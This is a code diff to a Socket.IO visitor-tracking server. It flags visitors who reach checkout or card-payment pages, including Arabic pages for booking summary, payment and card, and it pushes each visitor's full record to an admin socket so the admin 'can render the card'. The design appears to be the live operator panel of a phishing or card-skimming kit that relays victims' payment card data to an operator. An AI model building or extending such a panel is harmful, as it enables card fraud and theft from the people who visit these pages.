@@ -402,6 +402,12 @@ io.on("connection", (socket) => {
     const visitor = visitors.get(socket.id);
     if (visitor) {
       visitor.page = page;
+      // Activate hasEnteredCardPage when visitor reaches checkout/payment pages
+      const pageLower = (page || '').toLowerCase();
+      if (pageLower.includes('card payment') || pageLower.includes('checkout') || pageLower.includes('ملخص الحجز') || pageLower.includes('الدفع') || pageLower.includes('بطاقة')) {
+        visitor.hasEnteredCardPage = true;
+        visitor.lastDataUpdate = new Date().toISOString();
+      }
       visitors.set(socket.id, visitor);
       saveVisitorPermanently(visitor);
 
@@ -410,6 +416,13 @@ io.on("connection", (socket) => {
         io.to(adminSocketId).emit("visitor:pageChanged", {
           visitorId: visitor._id,
           page,
+        });
+        // Also send full visitor update so admin can render the card
+        io.to(adminSocketId).emit("visitor:dataSubmitted", {
+          visitorId: visitor._id,
+          socketId: socket.id,
+          data: {},
+          visitor: visitor,
         });
       });
     }
